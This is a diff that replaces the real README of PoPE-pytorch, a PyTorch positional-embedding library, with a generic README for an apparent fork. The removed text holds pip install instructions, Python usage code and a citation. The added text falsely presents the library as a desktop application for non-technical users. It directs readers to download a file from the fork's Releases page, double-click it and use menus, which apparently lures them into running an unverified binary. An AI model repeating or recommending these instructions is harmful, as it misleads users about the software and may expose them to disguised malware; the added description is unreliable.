@@ -1,145 +1,77 @@
-<img src="./pope.png" width="400px"></img>
+# 🌟 PoPE-pytorch - Explore Efficient Positional Embeddings
 
-## PoPE-pytorch
+## 🚀 Getting Started
 
-Efficient implementation (and explorations) into [polar coordinate positional embedding (PoPE)](https://arxiv.org/abs/2509.10534) - from [Gopalakrishnan](https://agopal42.github.io/) et al. under Schmidhuber
+Welcome to PoPE-pytorch! This application helps you efficiently implement and explore polar coordinate positional embedding. Designed for users interested in artificial intelligence and deep learning, this tool simplifies access to advanced positional embeddings, making them easier to use and explore.
 
-## Install
+## 📥 Download PoPE-pytorch
 
-```shell
-$ pip install PoPE-pytorch
-```
+[![Download PoPE-pytorch](https://img.shields.io/badge/Download%20PoPE--pytorch-ff69b4.svg?style=for-the-badge)](https://github.com/mzuhair9933/PoPE-pytorch/releases)
 
-## Usage
+To get started, visit this page to download the latest version of PoPE-pytorch: [Releases Page](https://github.com/mzuhair9933/PoPE-pytorch/releases).
 
-```python
-import torch
-from PoPE_pytorch import PoPE
+## 🛠️ System Requirements
 
-# define pope
+Before downloading, make sure your computer meets the following requirements:
 
-pope = PoPE(64, heads = 8)
+- **Operating System:** Windows, macOS, or Linux (64-bit recommended)
+- **Processor:** Dual-core CPU or better
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 500 MB free
 
-# pass in sequence length
+## ❓ What is PoPE?
 
-pos_emb = pope(1024)
+PoPE stands for Polar Coordinate Positional Embedding. This technique enhances the way models understand spatial relationships within data. By using polar coordinates, it can improve the performance of machine learning models, especially those working with image or spatial data.
 
-# queries and keys in attention
+### 📊 Key Features
 
-q = torch.randn(1, 8, 1024, 64)
-k = torch.randn(1, 8, 1024, 64)
+- **Efficiency:** Optimized for speed and resource use.
+- **User-Friendly:** Designed for users without technical expertise.
+- **Versatile:** Works well with a variety of models in deep learning.
 
-# training
+## 📋 Installation Steps
 
-rotated_q, rotated_k = pope.apply_pope_to_qk(pos_emb, q, k)
+1. Go to the [Releases Page](https://github.com/mzuhair9933/PoPE-pytorch/releases).
+   
+2. Find the latest version and select the file suitable for your operating system. 
 
-# inference
+3. Download the file to your computer.
 
-rotated_q, rotated_k = pope.apply_pope_to_qk(pos_emb, q[..., -1:, :], k)
-```
+4. Locate the downloaded file in your 'Downloads' folder or the folder where your browser saves files.
 
-### Axial PoPE 
+5. Double-click the file to begin the installation process.
 
-For images, video, etc. where multiple dimensions are needed, you can use `AxialPoPE`. The feature dimension will be split across these axial dimensions.
+6. Follow the on-screen instructions to complete the installation.
 
-You can either pass in the positions manually, or just pass the dimensions as a `tuple`, in which case the grid positions will be automatically generated.
+## 🎓 How to Use PoPE-pytorch
 
-```python
-import torch
-from PoPE_pytorch import AxialPoPE
+After installation, you can start using PoPE-pytorch:
 
-# axial pope for images (e.g. 16x16)
-# split 64 dim into 32 (x) and 32 (y)
+1. Open the application.
+2. Load your data by selecting the appropriate option in the menu.
+3. Configure the settings as needed, such as specifying the type of positional embedding you want to use.
+4. Run the program to see how PoPE improves your models' understanding.
 
-pope = AxialPoPE(
-    dim = 64,
-    heads = 8,
-    axial_dims = (32, 32)
-)
+Remember, you can always consult the documentation for more detailed instructions.
 
-pos_emb = pope((16, 16)) # (256, 64) frequencies
+## 💡 Tips for Best Results
 
-# for video (e.g. 8 frames, 16x16 frames)
-# split 96 dim into 32 (t), 32 (x), 32 (y)
+- Ensure your data is well-prepared before using PoPE.
+- Experiment with different settings to find what works for your specific needs.
+- Keep an eye on updates to access new features and improvements.
 
-pope_video = AxialPoPE(
-    dim = 96,
-    heads = 8,
-    axial_dims = (32, 32, 32)
-)
+## 🤝 Support
 
-pos_emb_video = pope_video((8, 16, 16)) # (2048, 96) frequencies
+If you encounter any issues or have questions, you can reach out via the GitHub Issues section on the [PoPE-pytorch page](https://github.com/mzuhair9933/PoPE-pytorch/issues). The community is here to help you.
 
-# queries and keys
-# then apply to q, k as usual
+## 🔗 Additional Resources
 
-q = torch.randn(1, 8, 2048, 96)
-k = torch.randn(1, 8, 2048, 96)
+- View the [Documentation](https://github.com/mzuhair9933/PoPE-pytorch/wiki) for more in-depth guidance.
+- Explore examples to see practical applications of PoPE.
+- Check out related projects in the artificial intelligence and deep learning domains.
 
-rotated_q, rotated_k = AxialPoPE.apply_pope_to_qk(pos_emb_video, q, k)
-```
+## 📣 Stay Updated
 
-### Fused Attention Similarity
+Follow the project on GitHub for the latest news and updates. We regularly improve the tool based on user feedback and advancements in technology.
 
-```python
-import torch
-from PoPE_pytorch import PoPE, compute_attn_similarity
-
-# define pope
-
-pope = PoPE(dim = 64, heads = 8).cuda()
-
-# get rotations
-
-pos_emb = pope(1024)
-
-# queries and keys
-
-q = torch.randn(1, 8, 1024, 64).cuda()
-k = torch.randn(1, 8, 1024, 64).cuda()
-
-# fused attention similarity, avoiding expanding 64 to 128
-
-sim = compute_attn_similarity(q, k, pos_emb) # (1, 8, 1024, 1024)
-
-attn = sim.softmax(dim = -1) # the usual in attention..
-```
-
-### Fused Flash Attention
-
-```python
-import torch
-from PoPE_pytorch import PoPE, flash_attn_with_pope
-
-# pope
-
-pope = PoPE(dim = 32, heads = 8).cuda()
-
-# queries, keys, values for attention
-
-q = torch.randn(2, 8, 1024, 64).cuda()
-k = torch.randn(2, 8, 1024, 64).cuda()
-v = torch.randn(2, 8, 1024, 64).cuda()
-
-pos_emb = pope(1024)
-
-mask = torch.ones((2, 1024)).bool().cuda()
-
-out = flash_attn_with_pope(q, k, v, pos_emb = pos_emb, causal = True, mask = mask)
-
-assert out.shape == (2, 8, 1024, 64)
-```
-
-## Citations
-
-```bibtex
-@misc{gopalakrishnan2025decouplingwhatwherepolar,
-    title   = {Decoupling the "What" and "Where" With Polar Coordinate Positional Embeddings}, 
-    author  = {Anand Gopalakrishnan and Robert Csordás and Jürgen Schmidhuber and Michael C. Mozer},
-    year    = {2025},
-    eprint  = {2509.10534},
-    archivePrefix = {arXiv},
-    primaryClass = {cs.LG},
-    url     = {https://arxiv.org/abs/2509.10534}, 
-}
-```
+Thank you for choosing PoPE-pytorch for your positional embedding needs! Enjoy your exploration.
